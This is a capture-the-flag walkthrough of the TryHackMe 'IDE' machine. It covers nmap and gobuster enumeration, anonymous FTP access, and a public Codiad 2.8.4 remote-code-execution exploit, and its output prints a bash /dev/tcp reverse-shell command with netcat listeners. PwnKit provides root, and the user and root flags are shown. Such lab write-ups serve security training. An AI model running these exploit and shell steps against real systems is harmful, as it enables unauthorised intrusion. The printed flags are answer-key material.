# IDE Machine

>  https://tryhackme.com/room/ide

> 10.10.92.177

--------------------------------

_nmap scan result_

```bash
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $nmap -sC -sV -A 10.10.92.177 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 15:23 EAT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.77% done; ETC: 15:24 (0:00:15 remaining)
Nmap scan report for 10.10.92.177
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE   VERSION
21/tcp   open     ftp       vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.62.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp   open     http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6566/tcp filtered sane-port
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

_default ftp login_ 

```bash
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $ftp 10.10.92.177
Connected to 10.10.92.177.
220 (vsFTPd 3.0.3)
Name (10.10.92.177:astute): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```
_content of file - from ftp_

```
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
_gobuster scan result && but nothing found_

```bash
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $gobuster dir -u http://10.10.92.177/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.92.177/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 15:30:47 Starting gobuster in directory enumeration mode
===============================================================
Progress: 17529 / 220561 (7.95%)
```

_gobuster on codiad.com_

```bash

┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $gobuster dir -u http://codiad.com -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codiad.com
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 15:42:09 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 9652]
/images               (Status: 301) [Size: 162] [--> http://codiad.com/images/]
/assets               (Status: 301) [Size: 162] [--> http://codiad.com/assets/]
/plugins              (Status: 200) [Size: 3358]                               
/fonts                (Status: 301) [Size: 162] [--> http://codiad.com/fonts/] 
/stylesheets          (Status: 301) [Size: 162] [--> http://codiad.com/stylesheets/]
```
_content of AUTHOR.txt could be one of the username_ 

```bash
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide/Codiad-v.2.8.4]
└──╼ $cat AUTHORS.txt 
Authors Ordered By First Contribution
--------------------------------------------------

Kent Safranski - @fluidbyte <kent@fluidbyte.net>
Tim Holum - @tholum
Gaurab Paul - @lorefnon
Shawn A - @tablatronix
Florent Galland - @Flolagale
Luc Verdier - @Verdier
Danny Morabito - @newsocialifecom <staff@newsocialife.com>
Alexander D - @daeks
Jean-Philippe Zolesio - @holblin

and all the other contributors - Thanks!
```

_hold back went to enumuration part and search fot exploit for codiad 2.8.4_

```bash
┌─[✗]─[astute@astute-vmwarevirtualplatform]─[~]
└──╼ $searchsploit codiad 2.8.4
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authe | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authe | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authe | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authe | multiple/webapps/50474.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
```

_got a reverse shell from the exploit_

``bash
[+] Exploit finished!
[+] Enjoy your reverse shell!
┌─[astute@astute-vmwarevirtualplatform]─[~/koth/notes/ide]
└──╼ $python3 49705.py http://10.10.92.177:62337/ john password 10.11.62.16 9578 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.11.62.16/9579 0>&1 2>&1"' | nc -lnvp 9578
nc -lnvp 9579
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

_privialge excalation done with pwnkit_

```bash

www-data
www-data@ide:/var/www/html/codiad/components/filemanager$ ls
class.dirzip.php       controller.php	  download.php
class.filemanager.php  dialog.php	  init.js
context_menu.json      dialog_upload.php  upload_scripts
www-data@ide:/var/www/html/codiad/components/filemanager$ cd ../../..
www-data@ide:/var/www/html$ cd ../../..
www-data@ide:/$ cd tmp
www-data@ide:/tmp$ ls
PwnKit
www-data@ide:/tmp$ chmod +x PwnKit 
www-data@ide:/tmp$ ./PwnKit 
root@ide:/tmp# 
 ```

 _user flag_

 ```bash

 root@ide:/home/drac# cat user.txt 
 02930d21a8eb009f6d26361b2d24a466
 root@ide:/home/drac# 

```

_root flag_

```
root@ide:~# cat root.txt 
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

